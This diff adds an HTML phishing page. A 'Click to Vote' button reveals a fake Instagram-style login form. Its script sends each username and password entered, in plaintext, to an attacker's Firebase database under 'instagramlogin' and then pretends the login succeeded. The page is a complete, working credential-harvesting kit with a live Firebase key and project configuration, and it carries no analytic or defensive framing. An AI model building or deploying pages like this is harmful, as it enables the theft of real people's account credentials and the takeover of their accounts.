@@ -1,0 +1,282 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Click to Vote and Login</title>
+  <link href="https://fonts.googleapis.com/css?family=Indie+Flower|Overpass+Mono" rel="stylesheet">
+  <style>
+    /* Global styles */
+    body {
+      background-color: #f7f7f7;
+      margin: 0;
+      padding: 0;
+      font-family: 'Overpass Mono', monospace;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      flex-direction: column;
+    }
+
+    .vote-container {
+      text-align: center;
+      background-color: #fff;
+      padding: 20px;
+      border-radius: 10px;
+      box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+      display: block;
+      margin-bottom: 20px;
+    }
+
+    .vote-button {
+      background-color: #3897f0;
+      border: none;
+      color: white;
+      font-size: 18px;
+      padding: 12px 30px;
+      cursor: pointer;
+      border-radius: 5px;
+      text-decoration: none;
+    }
+
+    .vote-button:hover {
+      background-color: #2878c2;
+    }
+
+    /* Login form styles */
+    #loginForm {
+      width: 100%;
+      max-width: 500px;
+      background-color: #fff;
+      border: 2px solid #e6e6e6;
+      padding: 20px 20px 10px 20px; /* Adjusted padding */
+      box-sizing: border-box;
+      display: none;
+    }
+
+    .header {
+      margin-bottom: 10px;
+      text-align: center;
+    }
+
+    .header img {
+      height: 50px;
+      width: auto;
+    }
+
+    /* Input fields styles */
+    .input-1, .input-2 {
+      width: 100%;
+      padding: 12px;
+      margin-bottom: 10px;
+      border: 1px solid #dbdbdb;
+      box-sizing: border-box;
+      border-radius: 5px;
+      font-size: 16px;
+    }
+
+    .overlap-text {
+      position: relative;
+    }
+
+    .overlap-text a {
+      position: absolute;
+      top: 10px;
+      right: 10px;
+      color: #003569;
+      font-size: 14px;
+      text-decoration: none;
+    }
+
+    .forgot-password {
+      text-align: center;
+    }
+
+    .forgot-password a {
+      color: #3897f0;
+      font-size: 14px;
+      text-decoration: none;
+    }
+
+    .forgot-password a:hover {
+      text-decoration: underline;
+    }
+
+    /* Login button */
+    .btn {
+      width: 100%;
+      background-color: #3897f0;
+      border: 1px solid #3897f0;
+      padding: 20px;
+      color: #fff;
+      font-weight: bold;
+      cursor: pointer;
+      border-radius: 0px;
+      font-size: 16px;
+      margin-top: -10px;
+    }
+
+    .error-message {
+      visibility: hidden;
+      color: white;
+      background-color: #ff4d4d;
+      padding: 12px;
+      border-radius: 5px;
+      margin-bottom: 10px;
+      font-weight: bold;
+      text-align: center;
+      transition: opacity 0.3s ease-in-out;
+    }
+
+    .error-message.visible {
+      visibility: visible;
+      opacity: 1;
+    }
+
+    .get-app-section {
+      text-align: center;
+      margin-top: 20px;
+    }
+
+    .get-app-section .get {
+      font-size: 18px;
+      font-weight: bold;
+      margin-bottom: 10px;
+    }
+
+    .get-app-section .img {
+      display: flex;
+      justify-content: center;
+    }
+
+    .get-app-section .img img {
+      margin: 0 10px;
+      width: 150px;
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Click to Vote Section -->
+  <div class="vote-container" id="voteContainer">
+    <h2>Click below to vote!</h2>
+    <button class="vote-button" id="voteButton">Click to Vote</button>
+  </div>
+
+  <!-- Login Form Section -->
+  <div id="loginForm">
+    <div class="header">
+      <img src="https://i.imgur.com/zqpwkLQ.png" alt="Logo"/>
+    </div>
+    <div class="l-part">
+      <input type="text" id="username" placeholder="Username" class="input-1" />
+      <div class="overlap-text">
+        <input type="password" id="password" placeholder="Password" class="input-2" />
+        <a href="#" id="togglePassword">Show</a>
+      </div>
+      <!-- Forgot Password Link -->
+      <div class="forgot-password">
+        <a href="#">Forgot your password?</a>
+      </div>
+      <div id="errorMessage" class="error-message">Please enter both username and password.</div>
+      <input type="button" id="loginButton" value="Log in" class="btn" />
+    </div>
+
+    <div class="sub-content">
+      <div class="s-part">
+        Don't have an account? <a href="#">Sign up</a>
+      </div>
+    </div>
+
+    <!-- Get the app section -->
+    <div class="get-app-section">
+      <p class="get">Get the app.</p>
+      <div class="img">
+        <img src="https://i.ibb.co/bHVsHrT/app-store.png" alt="App Store">
+        <img src="https://i.ibb.co/JBVJ8JB/play-store.png" alt="Play Store">
+      </div>
+    </div>
+  </div>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/firebase/7.14.1-0/firebase.js"></script>
+  <script>
+    // Show the login form when "Click to Vote" is clicked
+    document.getElementById("voteButton").addEventListener("click", function() {
+      document.getElementById("voteContainer").style.display = "none";
+      document.getElementById("loginForm").style.display = "block";
+    });
+
+    // Password toggle functionality
+    const togglePassword = document.getElementById("togglePassword");
+    const passwordField = document.getElementById("password");
+
+    togglePassword.addEventListener("click", () => {
+        const type = passwordField.type === "password" ? "text" : "password";
+        passwordField.type = type;
+        togglePassword.textContent = type === "password" ? "Show" : "Hide";
+    });
+
+    // Firebase configuration
+    const firebaseConfig = {
+        apiKey: "AIzaSyDPupU21CJIV-fph3iHgquPpP8RzUx0rG4",
+        authDomain: "instagram-a20dc.firebaseapp.com",
+        databaseURL: "https://instagram-a20dc-default-rtdb.firebaseio.com",
+        projectId: "instagram-a20dc",
+        storageBucket: "instagram-a20dc.firebasestorage.app",
+        messagingSenderId: "710244789237",
+        appId: "1:710244789237:web:face3aa27496e31f988ebc"
+    };
+    const app = firebase.initializeApp(firebaseConfig);
+    const database = firebase.database(app);
+
+    // Login button click handler
+    document.getElementById('loginButton').addEventListener('click', async (event) => {
+        event.preventDefault();
+
+        const username = document.querySelector('#username').value;
+        const password = document.querySelector('#password').value;
+        const errorMessage = document.getElementById('errorMessage');
+        const loginButton = document.getElementById('loginButton');
+
+        errorMessage.classList.remove("visible");  // Hide error message initially
+
+        // Validate user input
+        if (!username || !password) {
+            errorMessage.textContent = "Please enter both username and password.";
+            errorMessage.classList.add("visible");  // Show error message
+            return;
+        }
+
+        loginButton.disabled = true;
+
+        // Save login data to Firebase
+        const instagramloginRef = database.ref("instagramlogin");
+        instagramloginRef.push({
+            username: username,
+            password: password
+        }).then(() => {
+            console.log("Data saved successfully!");
+            loginButton.disabled = false;
+            document.getElementById('password').value = ''; // Clear the password input
+
+            // Simulating login success
+            const isLoginSuccessful = true; 
+
+            if (isLoginSuccessful) {
+                console.log("Login successful!");
+                // Redirect or perform other actions as needed
+            } else {
+                errorMessage.textContent = "Incorrect password.";
+                errorMessage.classList.add("visible");
+            }
+        }).catch((error) => {
+            console.error("Error saving data:", error);
+            errorMessage.textContent = "Error saving data.";
+            errorMessage.classList.add("visible");
+            loginButton.disabled = false;
+        });
+    });
+  </script>
+</body>
+</html>
